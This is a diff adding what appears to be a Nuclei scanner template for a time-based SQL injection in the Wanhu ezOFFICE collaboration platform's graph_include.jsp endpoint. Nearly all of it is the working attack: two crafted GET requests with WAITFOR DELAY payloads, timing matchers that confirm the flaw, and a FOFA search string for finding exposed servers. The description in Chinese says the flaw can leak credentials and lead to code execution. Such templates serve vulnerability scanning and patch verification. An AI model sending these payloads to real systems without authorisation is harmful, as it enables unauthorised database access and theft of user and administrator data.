@@ -1,0 +1,40 @@
+id: wanhuOA-ezOFFICE-graph_include-sql
+
+info:
+  name: "万户 ezOFFICE 协同管理平台 graph_include.jsp SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="万户ezOFFICE协同管理平台"
+      万户ezOFFICE协同管理平台/defaultroot/platform/report/graphreport/graph_include.jsp接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现非授权数据访问、敏感信息泄露，并在具备高权限条件下执行任意代码或控制系统资源。该漏洞允许远程攻击者绕过身份验证机制，直接与后端数据库交互，可能导致管理员凭证、用户隐私数据等敏感信息被提取，或通过数据库扩展功能实现服务器持久化控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486291&idx=1&sn=a747638a55572874c18a6bad950694ab&chksm=c267be60f5103776cf53c2c1a66ae086270736be13847bf69336f4fcd064fe2c7cb21b9074bc&token=661111678&lang=zh_CN#rd
+  tags: 万户 ezOFFICE
+
+
+http:
+- raw:
+  - |
+    GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+
+  - |
+    GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
